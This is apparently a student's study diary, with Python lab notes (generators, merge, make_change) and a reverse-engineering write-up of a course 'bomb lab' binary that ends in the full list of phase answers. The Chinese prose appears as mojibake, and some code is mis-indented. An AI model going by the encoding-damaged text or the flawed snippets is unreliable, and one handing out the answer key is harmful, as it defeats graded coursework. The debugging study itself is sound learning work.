## 5.4

è¦å¼€å¯æ–°çš„5æœˆä»½æ—…é€”äº†ï¼

å¼€å§‹lab05ï¼

pythonçš„`append`å’Œ`extend`

- `append` æ–¹æ³•ç”¨äºåœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå…ƒç´ 
- `extend` æ–¹æ³•ç”¨äºåœ¨åˆ—è¡¨æœ«å°¾ä¸€æ¬¡æ€§æ·»åŠ å¦ä¸€ä¸ªåºåˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚

è®°å½•ä¸‹`for`å¾ªç¯ä¸­çš„ä¿®æ”¹å¾ªç¯å˜é‡é—®é¢˜ï¼š

åœ¨ Python ä¸­ï¼Œé€šå¸¸ä¸å»ºè®®åœ¨å¾ªç¯ä½“å†…ç›´æ¥ä¿®æ”¹å¾ªç¯å˜é‡ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´é€»è¾‘æ··ä¹±æˆ–è€…æ„å¤–çš„ç»“æœã€‚å¾ªç¯å˜é‡ `i` åœ¨ `for` å¾ªç¯ä¸­æ˜¯ç”±è¿­ä»£å™¨ç”Ÿæˆçš„ï¼Œä¿®æ”¹å®ƒå¯èƒ½ä¼šå½±å“å¾ªç¯çš„è¡Œä¸ºã€‚

ç°åœ¨æˆ‘å†™çš„é”™è¯¯ä»£ç ä¸ºï¼š

```py
def insert_items(s, before, after):
    """Insert after into s after each occurrence of before and then return s.

    >>> test_s = [1, 5, 8, 5, 2, 3]
    >>> new_s = insert_items(test_s, 5, 7)
    >>> new_s
    [1, 5, 7, 8, 5, 7, 2, 3]
    >>> test_s
    [1, 5, 7, 8, 5, 7, 2, 3]
    >>> new_s is test_s
    True
    >>> double_s = [1, 2, 1, 2, 3, 3]
    >>> double_s = insert_items(double_s, 3, 4)
    >>> double_s
    [1, 2, 1, 2, 3, 4, 3, 4]
    >>> large_s = [1, 4, 8]
    >>> large_s2 = insert_items(large_s, 4, 4)
    >>> large_s2
    [1, 4, 4, 8]
    >>> large_s3 = insert_items(large_s2, 4, 6)
    >>> large_s3
    [1, 4, 6, 4, 6, 8]
    >>> large_s3 is large_s
    True
    """
    "*** YOUR CODE HERE ***"
    """
        è§£å†³æ€è·¯ï¼š
            1. foréå†åºåˆ—sï¼ŒæŸ¥è¯¢æ˜¯å¦å­˜åœ¨ç­‰äºbeforeçš„å€¼
            2. e == before, å°†afteræ’å…¥åˆ°eåé¢
            3. ç´¢å¼•è·³åˆ°æ’å…¥çš„afterå€¼åé¢
    """
    for i in range(len(s)+1):
        if s[i] == before:
            s.insert(i+1, after)
            i = i + 2
    return s
```

æˆ‘æƒ³è¦ç´¢å¼•ç•¥è¿‡æ–°æ’å…¥çš„afterå€¼ ï¼Œä½†æ˜¯ä¸äº†è§£å¾ªç¯å˜é‡ `i` åœ¨ `for` å¾ªç¯ä¸­æ˜¯ç”±è¿­ä»£å™¨ç”Ÿæˆçš„ï¼Œä¸èƒ½éšä¾¿ä¿®æ”¹forå¾ªç¯ä¸­çš„ç´¢å¼•iã€‚

è¿™æ ·çš„ç»“æœå°±æ˜¯å³ä½¿åœ¨åˆ¤æ–­ä¸­ä¿®æ”¹äº†`i`çš„å€¼ï¼Œä½†æ˜¯å›åˆ°å¾ªç¯è¿­ä»£ç»™`i`èµ‹å€¼çš„é˜¶æ®µï¼Œ`i`åˆä¼šé‡æ–°è¢«è¿­ä»£å™¨ç”Ÿæˆçš„å€¼èµ‹å€¼ï¼Œæ‰€ä»¥è¾¾ä¸åˆ°`i+2`çš„ç»“æœã€‚

æ‰€ä»¥ç›´æ¥ç”¨`while`ï¼š

```py
def insert_items(s, before, after):
	i = 0
    while  i < len(s):
        if s[i] == before:
            s.insert(i+1, after)
            i = i + 1
        i += 1
    return s
```

bomblab phase6ï¼š

```assembly
=> 0x00000000004010f4 <+0>:     push   %r14
   0x00000000004010f6 <+2>:     push   %r13
   0x00000000004010f8 <+4>:     push   %r12
   0x00000000004010fa <+6>:     push   %rbp
   0x00000000004010fb <+7>:     push   %rbx
   0x00000000004010fc <+8>:     sub    $0x50,%rsp
   0x0000000000401100 <+12>:    mov    %rsp,%r13					#int *r13 = rsp
   0x0000000000401103 <+15>:    mov    %rsp,%rsi
   0x0000000000401106 <+18>:    call   0x40145c <read_six_numbers> #num1 - num6
   0x000000000040110b <+23>:    mov    %rsp,%r14				   #int *r14 = num1 = *rsp
   0x000000000040110e <+26>:    mov    $0x0,%r12d					# int i(r12d) = 0
   0x0000000000401114 <+32>:    mov    %r13,%rbp					# int *rbp = rsp
   0x0000000000401117 <+35>:    mov    0x0(%r13),%eax				# int eax = num1
   0x000000000040111b <+39>:    sub    $0x1,%eax					# if (rsp[0] <= 6)
   0x000000000040111e <+42>:    cmp    $0x5,%eax
   0x0000000000401121 <+45>:    jbe    0x401128 <phase_6+52>
   0x0000000000401123 <+47>:    call   0x40143a <explode_bomb>
   
   #<+0>- <+47>:è¾“å…¥çš„6ä¸ªå€¼å‡å°äºç­‰äº6
   0x0000000000401128 <+52>:    add    $0x1,%r12d					#i ++  (i = 1)
   0x000000000040112c <+56>:    cmp    $0x6,%r12d					# cmp 6 and i
   0x0000000000401130 <+60>:    je     0x401153 <phase_6+95>
  					
  					# if(i < 6)
   0x0000000000401132 <+62>:    mov    %r12d,%ebx				# int ebx = i (ebx = 1)
   0x0000000000401135 <+65>:    movslq %ebx,%rax				# Move sign-extended double word to quad word	
   																# rax = 1
   0x0000000000401138 <+68>:    mov    (%rsp,%rax,4),%eax		# rax = rsp[1]
   0x000000000040113b <+71>:    cmp    %eax,0x0(%rbp)			# if(rsp[1] != rsp[0])		
   0x000000000040113e <+74>:    jne    0x401145 <phase_6+81>
   0x0000000000401140 <+76>:    call   0x40143a <explode_bomb>
   					# rsp[1] != rsp[0]
   0x0000000000401145 <+81>:    add    $0x1,%ebx				# ebx += 1(ebx = 2)
   0x0000000000401148 <+84>:    cmp    $0x5,%ebx				# ebx <= 5
   0x000000000040114b <+87>:    jle    0x401135 <phase_6+65>
   #<+62> - <+87>åˆ†æï¼šéå†è¾“å…¥çš„6ä¸ªæ•°æ®ï¼Œåˆ¤æ–­æ˜¯å¦åäº”ä¸ªå‡ä¸ç­‰äºnum[0]
   
   
   0x000000000040114d <+89>:    add    $0x4,%r13				# *r13 = rsp + 1
   0x0000000000401151 <+93>:    jmp    0x401114 <phase_6+32>
   #<+32> - <+93>ï¼šåˆ¤æ–­æ˜¯å¦è¾“å…¥çš„æ‰€æœ‰æ•°å­—å‡å°äºç­‰äº6ï¼Œä¸”äº’ä¸ç›¸ç­‰
   
   
   					# if(i == 6) æ­¤æ—¶æ»¡è¶³çš„æ¡ä»¶æ˜¯ï¼šè¾“å…¥çš„æ‰€æœ‰æ•°å­—å‡å°äºç­‰äº6ï¼Œä¸”äº’ä¸ç›¸ç­‰
   0x0000000000401153 <+95>:    lea    0x18(%rsp),%rsi		# int *rsi = rsp + 6	(24 / 4 = 6 words) = 0
   0x0000000000401158 <+100>:   mov    %r14,%rax			# int *rax = rsp
   0x000000000040115b <+103>:   mov    $0x7,%ecx			# int ecx = 7
   0x0000000000401160 <+108>:   mov    %ecx,%edx			# edx = 7
   0x0000000000401162 <+110>:   sub    (%rax),%edx			# edx = 7 - rsp[0]
   0x0000000000401164 <+112>:   mov    %edx,(%rax)			# *rsp = 7 - rsp[0]
   0x0000000000401166 <+114>:   add    $0x4,%rax			# rax = rsp + 1(*rax = rsp[1])
   0x000000000040116a <+118>:   cmp    %rsi,%rax			# æŒ‡é’ˆ rax ç´¢å¼•rspåˆ°rsp+5çš„6ä¸ªè¾“å…¥æ•°å­—
   0x000000000040116d <+121>:   jne    0x401160 <phase_6+108>
   #<+95> - <+121>ï¼šæŒ‡é’ˆraxç´¢å¼•è¾“å…¥çš„6ä¸ªæ•°å­—ï¼Œå¹¶ä¸”é‡æ–°èµ‹å€¼ä¸ºnum[i] = 7-num[i]
   
   
# ------------------- å°†rsp[i]é‡æ–°èµ‹å€¼ä¸º7 - rsp[i]------------------

   0x000000000040116f <+123>:   mov    $0x0,%esi				# int rsi = 0
   0x0000000000401174 <+128>:   jmp    0x401197 <phase_6+163>
   																# eax = 1, *edx = 0x6032d0
   0x0000000000401176 <+130>:   mov    0x8(%rdx),%rdx			# rdx = mem(0x6032d0 + 8) = 6304480
   0x000000000040117a <+134>:   add    $0x1,%eax				# eax ++ (eax = 2)
   0x000000000040117d <+137>:   cmp    %ecx,%eax				# compare eax and ecx(rsp[0])
   0x000000000040117f <+139>:   jne    0x401176 <phase_6+130>	# if eax != rsp[0]: eax ++
   0x0000000000401181 <+141>:   jmp    0x401188 <phase_6+148>	#	æ­¤æ—¶ä¸€å®šæ»¡è¶³rax == rsp[0]


						#if(rsp[i] <= 1)
   0x0000000000401183 <+143>:   mov    $0x6032d0,%edx			# int *edx = 0x6032d0(*edx = 332)
   0x0000000000401188 <+148>:   mov    %rdx,0x20(%rsp,%rsi,2)	# 8ï¼ˆ32bytes = 8words--intï¼‰ + rsp + 2 * rsi = 0x6032d0
   #åœ¨40118dæ‰“æ–­ç‚¹ï¼Œè°ƒè¯•å¯ä»¥ç¡®è®¤æ¯æ¬¡å°†rsp[8+2i]èµ‹å€¼ä»€ä¹ˆäº†
   
   0x000000000040118d <+153>:   add    $0x4,%rsi				# rsi + 1
   0x0000000000401191 <+157>:   cmp    $0x18,%rsi				# rsi and 6
   0x0000000000401195 <+161>:   je     0x4011ab <phase_6+183>
   
   0x0000000000401197 <+163>:   mov    (%rsp,%rsi,1),%ecx		# ecx = rsp[rsi] 
   0x000000000040119a <+166>:   cmp    $0x1,%ecx				# compare rsp[rsi] and 1 
   0x000000000040119d <+169>:   jle    0x401183 <phase_6+143>	
   # <+143> - <+169>:å¦‚æœ7-num[i]å°äºç­‰äº1ï¼Œåˆ™å°†ç»™rsp+8(32 = 0x20)ã€10(40 = 0x28)ã€12(48 = 0x30)ã€14(56 = 0x38)ã€16(64 = 0x40)ã€18èµ‹å€¼
   # ä¸º0x6032d0
   
   						#if(rsp[i] > 1)
   0x000000000040119f <+171>:   mov    $0x1,%eax				# int eax = 1
   0x00000000004011a4 <+176>:   mov    $0x6032d0,%edx			# int *edx = 0x6032d0
   0x00000000004011a9 <+181>:   jmp    0x401176 <phase_6+130>
   
   
   0x00000000004011ab <+183>:   mov    0x20(%rsp),%rbx			# rbx = rsp[8]
   0x00000000004011b0 <+188>:   lea    0x28(%rsp),%rax			# rax = rsp + 10
   0x00000000004011b5 <+193>:   lea    0x50(%rsp),%rsi			# rsi = rsp + 20
   0x00000000004011ba <+198>:   mov    %rbx,%rcx				# rcx = rsp[8]
   0x00000000004011bd <+201>:   mov    (%rax),%rdx				# rdx = rsp[10]
   0x00000000004011c0 <+204>:   mov    %rdx,0x8(%rcx)			# *(rcx + 0x8) = rsp[10]
   0x00000000004011c4 <+208>:   add    $0x8,%rax				# rax = rsp + 10 + 2
   0x00000000004011c8 <+212>:   cmp    %rsi,%rax				# if rax != rsp+20
   
   0x00000000004011cb <+215>:   je     0x4011d2 <phase_6+222>
   0x00000000004011cd <+217>:   mov    %rdx,%rcx				# rcx = rsp[10]
   0x00000000004011d0 <+220>:   jmp    0x4011bd <phase_6+201>
   # <+183> - <+220>:ä¸çŸ¥é“åšäº†ä»€ä¹ˆï¼Œåº”è¯¥æ˜¯å°†rsp[10]ã€rsp[12]ã€...ã€rsp[18]çš„æ‰€æœ‰å€¼ï¼Œèµ‹å€¼ç»™
   
   						# if rax == rsp+20
   						# è·³å‡ºå¾ªç¯æ—¶ï¼Œrax=rsp+20,rdx = *(rsp+18),rbx = *(rsp + 8)
   0x00000000004011d2 <+222>:   movq   $0x0,0x8(%rdx)
   0x00000000004011da <+230>:   mov    $0x5,%ebp
   0x00000000004011df <+235>:   mov    0x8(%rbx),%rax	# rax = *(rsp[8] + 2);//é“¾è¡¨æŒ‡é’ˆåŸŸ
   0x00000000004011e3 <+239>:   mov    (%rax),%eax		# rax = *(rax);//rax ä¸ºnode->next
   0x00000000004011e5 <+241>:   cmp    %eax,(%rbx)	# ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ å’Œ æ­¤èŠ‚ç‚¹ çš„ä½32ä½æ•°æ®è¿›è¡Œæ¯”å¯¹		
   0x00000000004011e7 <+243>:   jge    0x4011ee <phase_6+250>	# ä¿è¯å½“å‰èŠ‚ç‚¹çš„ä½32ä½æ•°æ®è¦å¤§äºä¸‹ä¸€èŠ‚ç‚¹çš„ä½32ä½æ•°æ®
   
   0x00000000004011e9 <+245>:   call   0x40143a <explode_bomb>
   0x00000000004011ee <+250>:   mov    0x8(%rbx),%rbx
   0x00000000004011f2 <+254>:   sub    $0x1,%ebp
   0x00000000004011f5 <+257>:   jne    0x4011df <phase_6+235>
   0x00000000004011f7 <+259>:   add    $0x50,%rsp
   0x00000000004011fb <+263>:   pop    %rbx
   0x00000000004011fc <+264>:   pop    %rbp
   0x00000000004011fd <+265>:   pop    %r12
   0x00000000004011ff <+267>:   pop    %r13
   0x0000000000401201 <+269>:   pop    %r14
   0x0000000000401203 <+271>:   ret
```

## 5.5

å°†æ±‡ç¼–è¯­è¨€åæ±‡ç¼–ä¸ºCä¼ªä»£ç åï¼š

```C
phase_6(char *str){
    int *rsp = read_six_numbers(str);//rsp[0] = input[0] ---> rsp[5] = input[5]
    for(int i = 0; i < 6; i++){
        //è¾“å…¥æ•°å­—å‡å°äºç­‰äº6ï¼Œä¸”æ‰€æœ‰æ•°å­—å‡ä¸ç›¸åŒ
        for(int j = i + 1; j < 6; j++){
            if(rsp[i] > 6 || rsp[j] == rsp[i]){
                return explode_bomb();
            }
        }		
    }
	
	//å°†æ‰€æœ‰æ•°å­—ç½®ä¸º7å‡å»è‡ªèº«
	for(int i = 0; i < 6; i++){
		rsp[i] = 7 - rsp[i];
	}
	
	int i = 0;
		
	//rsp[8]ã€rsp[10]ã€rsp[12]ã€rsp[14]ã€rsp[16]ã€rsp[18]å‡ä¼šè¢«èµ‹å€¼
	while(i < 6){
		if(rsp[i] <= 1){//7-rsp[i] and 1//	num[i] >= 6
			rsp[8 + 2*i] = 0x6032d0;
		}else{
			int eax = 1;
			int edx = 0x6032d0;
			do{
				//edx = 2ï¼š0x006032e0ï¼Œ3ï¼š0x006032f0ï¼Œ4ï¼š0x00603300ï¼Œ5ï¼š0x00603310ï¼Œ6ï¼š0x00603320
				edx = *(edx + 0x8);
				eax++;
			}while(eax != rsp[i]);
			//rax == rsp[i]
			rsp[8 + 2*i] = edx;
		}
		i++;
	}
	//ä¿®æ”¹nodeèŠ‚ç‚¹çš„æŒ‡é’ˆåŸŸ
	int rbx = rsp[8]; 	//å­˜å‚¨çš„æ˜¯é“¾è¡¨èŠ‚ç‚¹ä½ç½®/æŒ‡é’ˆåŸŸ
	int *rax = rsp + 10;
	int *rsi = rsp + 20;//è¾¹ç•Œ
	do{
		// *(rsp[8] + 2) = rsp[10]
		// *(rsp[10] + 2) = rsp[12]
		/* ....
		   *(rsp[16] + 2) = rsp[18]
		*/
		int rcx = rbx;
		int rdx = *rax;
		*(rbx + 2) = *(rax);//ä¿®æ”¹é“¾è¡¨çš„æŒ‡é’ˆåŸŸ
		rax = rax + 2;
		&rbx ++;
	}while(rax < rsi);
	
    //åˆ¤æ–­rsp[8]åˆ°rsp[18]æ‰€æŒ‡çš„èŠ‚ç‚¹ï¼Œå€¼åŸŸæ˜¯å¦å‡åä¸€ä¸ªå¤§äºå‰ä¸€ä¸ª
	//è·³å‡ºå¾ªç¯æ—¶ï¼Œrax=rsp+20,rdx = *(rsp+18),rbx = *(rsp + 8)
    //rax            0x7fffffffe0b0 == rsp+20
    //rbx            0x603320       == *(rsp + 8)
	//rcx            0x6032e0            6304480
	//rdx            0x6032d0       == *(rsp+18)

	rdx = rsp[18];
	rbx = rsp[8]
	*(rsp[18] + 2) = 0;
	ebp = 5;
    while(ebp != 0){
        rax = *(rsp[8] + 2);//é“¾è¡¨æŒ‡é’ˆåŸŸ
		rax = *(rax);		//å°†æ­¤èŠ‚ç‚¹ç»™æŒ‡é’ˆrax
		if(*(rbx) >= rax){//å°†å‰ä¸€èŠ‚ç‚¹ï¼ˆ*(rbx)ï¼‰å’Œåä¸€ä¸ªèŠ‚ç‚¹çš„å€¼ï¼ˆçŒœæµ‹ä¸ºå€¼åŸŸ:å“ªé‡Œä¸ºå€¼åŸŸï¼‰è¿›è¡Œæ¯”è¾ƒ
			rbx = *(rsp[8] + 2);//rbxæŒ‡å‘é“¾è¡¨çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹
		//è¿™é‡Œä¿è¯äº†ä¿®æ”¹å®ŒæŒ‡é’ˆåŸŸåçš„é“¾è¡¨ï¼Œå‰ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼è¦å¤§äºåä¸€ä¸ªèŠ‚ç‚¹çš„å€¼
		}
        ebp--;
    }

	
}
```

è¡¥å……`0x6032d0`å¤„çš„æ•°æ®ï¼š

```assembly
(gdb) x/24xw 0x6032d0
0x6032d0 <node1>:       0x0000014c      0x00000001      0x006032e0      0x00000000
0x6032e0 <node2>:       0x000000a8      0x00000002      0x006032f0      0x00000000
0x6032f0 <node3>:       0x0000039c      0x00000003      0x00603300      0x00000000
0x603300 <node4>:       0x000002b3      0x00000004      0x00603310      0x00000000
0x603310 <node5>:       0x000001dd      0x00000005      0x00603320      0x00000000
0x603320 <node6>:       0x000001bb      0x00000006      0x00000000      0x00000000
```

å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªé“¾è¡¨ç»“æ„ï¼Œé•¿åº¦ä¸º6ï¼Œä¾æ¬¡å­˜å‚¨1åˆ°6çš„å€¼ã€‚

ç»è¿‡åˆ†æï¼š

1. rsp[8]åˆ°rsp[18]ä¿å­˜çš„æ˜¯ä»¥0x6032d0å¼€å¤´çš„é“¾è¡¨åœ°å€
2. æœ€åä¸€æ­¥åˆ¤æ–­æ¡ä»¶ï¼Œä¿è¯ä¿®æ”¹å®ŒæŒ‡é’ˆåŸŸåçš„é“¾è¡¨ï¼Œå‰ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼è¦å¤§äºåä¸€ä¸ªèŠ‚ç‚¹çš„å€¼
3. æ‰“å°0x6032d0å¤„çš„æ•°æ®å¯ä»¥çœ‹å‡ºï¼Œè‹¥æƒ³å€¼åŸŸä»å¤§åˆ°å°æ’åˆ—ï¼Œé‚£å°±éœ€è¦rsp[8]æŒ‡å‘ç»“æ„ï¼šnode3 -> node4 -> node5 -> node6 -> node1 -> node2ã€‚
4. ç­‰æ—¥åå†åˆ†æå§ï¼Œä»Šæ™šå¾ˆç´¯

æœ€ç»ˆç­”æ¡ˆä¸ºï¼š

```tex
Border relations with Canada have never been better.
1 2 4 8 16 32
2 707
7 0
9on567
4 3 2 1 6 5
```

æ™šå®‰ã€‚

## 5.6

é‡æ–°å›é¡¾`lambda`è¡¨è¾¾å¼ã€‚

```py
     lambda            x            :          f(g(x))
"A function that    takes x    and returns     f(g(x))"
```

**disc6**

è·å–å¤§äº2024çš„æ–æ³¢é‚£å¥‘æ•°ï¼š

ç”Ÿæˆå¤§äº2024æ–æ³¢é‚£å¥‘æ•°çš„ç”Ÿæˆå™¨ï¼š`filter(lambda n: n > 2024, gen_fib())`

```python
def gen_fib():
    n, add = 0, 1
    while True:
        yield n
        n, add = n + add, n

next(filter(lambda n: n > 2024, gen_fib()))
```

åˆ†æï¼š

- **filter**(*function*, *iterable*)ï¼š is equivalent to the generator expression `(item for item in iterable if function(item))`
- `filter()`å‡½æ•°å°†ç¬¬ä¸€ä¸ªåˆ¤æ–­næ˜¯å¦å¤§äº2024ä½œä¸ºåˆ¤æ–­æ¡ä»¶å‡½æ•°ï¼Œå°†ç”Ÿæˆå™¨å‡½æ•°`gen_fib()`ä½œä¸ºå¯è¿­ä»£å€¼ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œå°†è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€‚è¿™ä¸ªè¿­ä»£å™¨çš„ä½œç”¨å°±æ˜¯è·å–å¤§äº2024çš„æ–æ³¢é‚£å¥‘æ•°ã€‚
- The `filter` function returns an iterator over, `zip`, and `reversed` functions also return iterators.An iterator object is created that can return results if queried using `next`.

**Q2: Merge**

Write a generator function `merge` that takes in two infinite generators `a` and `b` that are in increasing order without duplicates and returns a generator that has all the elements of both generators, in increasing order, without duplicates.

é—®é¢˜æŠ½è±¡ï¼šæŒ‰ç…§é€’å¢åºåˆ—æ’ä¸¤ä¸ªè¿­ä»£å™¨çš„å€¼ï¼Œå¹¶ä¸”ä¸èƒ½é‡å¤

é—®é¢˜åˆ†æï¼š

1. è·å–ä¸¤ä¸ªè¿­ä»£å™¨çš„å€¼ï¼šv1 = next(a), v2 = next(b)
2. å¦‚æœv1 < v2ï¼Œåˆ™yield v1ï¼Œéšåv1 = next(a)
3. å¦‚æœv2 < v1ï¼Œåˆ™yield v2ï¼Œéšåv2 = next(b)
4. å¦‚æœv1 = v2ï¼Œåˆ™yield v1ï¼Œéšåv1 = next(a)å¹¶ä¸”v2 = next(b)

```py
def merge(a, b):
    """Q2:
    >>> def sequence(start, step):
    ...     while True:
    ...         yield start
    ...         start += step
    >>> a = sequence(2, 3) # 2, 5, 8, 11, 14, ...
    >>> b = sequence(3, 2) # 3, 5, 7, 9, 11, 13, 15, ...
    >>> result = merge(a, b) # 2, 3, 5, 7, 8, 9, 11, 13, 14, 15
    >>> [next(result) for _ in range(10)]
    [2, 3, 5, 7, 8, 9, 11, 13, 14, 15]
    """
    "*** YOUR CODE HERE ***"
        v1, v2 = next(a), next(b)
    while True:
      if v1 < v2:
          yield v1
          v1 = next(a)
      elif v2 < v1:
          yield v2
          v2 = next(b)
      else:
          yield v1
          v1 = next(a)
          v2 = next(b)
```

## 5.7

leave offï¼šIf something continues from where it left off, it starts happening again at the point where it had previously stopped.

feel so lonely,so you can make friends by some ways and do something to make you happy.

## 5.8

`min` å‡½æ•°åœ¨å¤„ç†å­—å…¸æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šåŸºäºå­—å…¸çš„é”®è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è¿”å›å…·æœ‰æœ€å°é”®çš„é”®-å€¼å¯¹ï¼ˆæˆ–è€…åªè¿”å›æœ€å°çš„é”®ï¼Œå–å†³äºå…·ä½“ç”¨æ³•ï¼‰ã€‚`min` å‡½æ•°çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š

```py
min(iterable, key=None, default=...)
```

- `iterable`ï¼šè¦æ¯”è¾ƒçš„å¯è¿­ä»£å¯¹è±¡ï¼Œé€šå¸¸æ˜¯å­—å…¸çš„é”®æˆ–è€…é”®å€¼å¯¹ã€‚
- `key`ï¼šå¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šæ¯”è¾ƒçš„å…³é”®å­—å‡½æ•°ï¼Œç±»ä¼¼äº `sorted` å‡½æ•°ä¸­çš„ `key` å‚æ•°ã€‚
- `default`ï¼šå¯é€‰å‚æ•°ï¼Œåœ¨å¯è¿­ä»£å¯¹è±¡ä¸ºç©ºæ—¶è¿”å›çš„é»˜è®¤å€¼ã€‚

```py
coins = {2: 2, 3: 2, 4: 3, 5: 1}
smallest = min(coins)
```

è¿™é‡Œçš„minå‡½æ•°æ˜¯é€‰å‡ºé¢é¢ï¼ˆkeyï¼‰æœ€å°çš„ç¡¬å¸ã€‚

å¾—åˆ°äº†å³°å“¥çš„ä¿¡ä»»ï¼Œå“¥ä»¬å°½é‡åŠªåŠ›ä¸è¾œè´Ÿè‡ªå·±çš„æ—¶å…‰ã€‚

ä»Šå¤©çŠ¶æ€ä¸ä½³ï¼Œè¯·å¥½å¥½çˆ±è‡ªå·±broï¼(â—'â—¡'â—)

## 5.9

> ### Q3: Make Change
>
> Implement `make_change`, which takes a positive integer `amount` and a dictionary of `coins`. The `coins` dictionary keys are positive integer denominations and its values are positive integer coin counts. For example, `{1: 4, 5: 2}` represents four pennies and two nickels. The `make_change` function returns a list of coins that sum to `amount`, where the count of any denomination `k` in the return value is at most `coins[k]`.
>
> If there are multiple ways to make change for `amount`, prefer to use as many of the smallest coins available and place the smallest coins first in the returned list.

```py
def make_change(amount, coins):
    """Return a list of coins that sum to amount, preferring the smallest coins
    available and placing the smallest coins first in the returned list.

    The coins argument is a dictionary with keys that are positive integer
    denominations and values that are positive integer coin counts.

    >>> make_change(2, {2: 1})
    [2]
    >>> make_change(2, {1: 2, 2: 1})
    [1, 1]
    >>> make_change(4, {1: 2, 2: 1})
    [1, 1, 2]
    >>> make_change(4, {2: 1}) == None
    True

    >>> coins = {2: 2, 3: 2, 4: 3, 5: 1}
    >>> make_change(4, coins)
    [2, 2]
    >>> make_change(8, coins)
    [2, 2, 4]
    >>> make_change(25, coins)
    [2, 3, 3, 4, 4, 4, 5]
    >>> coins[8] = 1
    >>> make_change(25, coins)
    [2, 2, 4, 4, 5, 8]
    """
    if not coins:
        return None
    smallest = min(coins)
    rest = remove_one(coins, smallest)
    if amount < smallest:
        return None
    elif amount == smallest:	#base case
        return [smallest]
    else:
        result = make_change(amount-smallest, rest)
        # result == None: Unable to perform next split
        if result:
            return [smallest] + result
        else:
            return make_change(amount, rest)
```

å¼€å§‹attack lab:

- reference material for this lab:3.10.3 `Out-of-Bounds Memory References and Buffer Overflow`å’Œ3.10.4`Thwarting Buffer Overflow Attacks`

## 5.10

å›é¡¾æ˜¨å¤©æ‰€å­¦çš„lab06ï¼š

1. Q1: Bank Accountï¼šè¦æƒ³åœ¨accountä¸­è®°å½•å­˜å–é’±çš„æµæ°´ï¼Œéœ€è¦å•ç‹¬å®šä¹‰ä¸€ä¸ªäº¤æ˜“æµæ°´ç±»ï¼Œè¿™ä¸ªç±»å°±æ˜¯`Transaction`ã€‚ç”¨æˆ·æ¯ä¸€æ¬¡å­˜å–é’±çš„æ—¶å€™ï¼Œéƒ½å®ä¾‹åŒ–ä¸€ä¸ªäº¤æ˜“å®ä¾‹ï¼Œå¹¶ä¸”å°†å…¶å­˜æ”¾åœ¨è¿™ä¸ªç”¨æˆ·ä¸­ã€‚

2. Q2: Emailï¼šå®ç°ä¸€ä¸ªé‚®ä»¶ä¼ è¾“çš„é€»è¾‘ã€‚A `Client` can `compose` an email, which it will `send` to the `Server`. The `Server` then delivers it to the `inbox` of another `Client`. To achieve this, a `Server` has a dictionary called `clients` that matches the `recipient_name` in an `Email` to the `Client` object with that name.

   ç”¨æˆ·å¯ä»¥åˆ›å»ºé‚®ä»¶ï¼Œé‚®ä»¶ä¼šè‡ªåŠ¨å‘é€åˆ°æœåŠ¡å™¨ã€‚

   æœåŠ¡å™¨ä¼šå°†é‚®ä»¶æŠ•é€’åˆ°å¯¹åº”æ”¶ä»¶äººçš„æ”¶ä»¶ç®±ä¸­ã€‚è¿™æ ·æœåŠ¡å™¨å°±éœ€è¦æœ‰ä¸€ä¸ªå¯¹åº”çš„ç”¨æˆ·å­—å…¸ï¼šæŒ‰ç…§æ”¶ä»¶äººåç§°æ¥è·å–æ”¶ä»¶äººçš„ä¿¡æ¯ï¼Œä»ä¸­è·å–åˆ°æ”¶ä»¶ç®±çš„åœ°å€å¹¶å­˜æ”¾è¿›å»ã€‚

3. Q3: Make Changeï¼šè¾“å…¥ä¸€ä¸ªæ€»é‡‘é¢å’Œæ‰‹é‡Œçš„é›¶é’±å­—å…¸ï¼ˆé¢é¢ä¸ºkeyï¼Œæ•°é‡ä¸ºvalueï¼‰ï¼Œè¿”å›ä¸€ä¸ªé›¶é’±å‡‘æ•°ç­–ç•¥ã€‚è¿™ä¸ªç­–ç•¥éœ€è¦ä¿è¯æœ€å°é¢é¢é›¶é’±å°½é‡å¤šï¼Œä¸”åœ¨åˆ—è¡¨å±•ç¤ºä¸­æ›´é å‰ã€‚

   è§£å†³æ€è·¯ï¼š

   `make_change(amount, coins)`ï¼šè¿”å›ä¸€ä¸ªç¡¬å¸é¢é¢åˆ—è¡¨ï¼Œæ€»å’Œæ°å¥½ä¸ºæ€»é‡‘é¢ã€‚

   - æ‹¿ä¸€æšæœ€å°çš„é¢é¢ç¡¬å¸`smallest`å»å‡‘æ•°ï¼Œç”¨æ€»é‡‘é¢`amount`å‡å»è¿™ä¸ªç¡¬å¸çš„é‡‘é¢ï¼Œå¾—åˆ°å‰©ä½™æ€»é‡‘é¢`rest_amount`
   - å¦‚æœ`rest_amount`æ°å¥½ç­‰äº0ï¼Œè¯æ˜è¿™ä¸ªç¡¬å¸é¢å€¼`coin`åˆšå¥½ç­‰äºæ€»é‡‘é¢`amount`ï¼Œç›´æ¥è¿”å›`[smallest]`ã€‚
   - å¦‚æœ`rest_amount`å°äº0ï¼Œåˆ™è¯æ˜æ‰‹ä¸­çš„æœ€å°é¢é¢é›¶é’±å·²ç»å¤§äºæ€»é‡‘é¢äº†ï¼Œæ­¤æ—¶ä¸éœ€è¦å†ç»§ç»­ç»™é›¶é’±ï¼Œç›´æ¥è¿”å›`None`
   - å¦‚æœ`rest_amount`å¤§äº0ï¼Œåˆ™åœ¨ç¡¬å¸å­—å…¸ä¸­å‡å»æ­¤é¢é¢`smallest`ç¡¬å¸ä¸€ä¸ªæ•°é‡ï¼Œè·å¾—`rest_conis`ï¼›å¹¶ä¸”å°†å‰©ä½™é‡‘é¢`rest_amount`ä½œä¸º`amount`ï¼Œé‡æ–°è°ƒç”¨`make_change(amount, coins)`å‡½æ•°ï¼Œå¹¶ä¸”è·å–è¿”å›å€¼`result`ã€‚
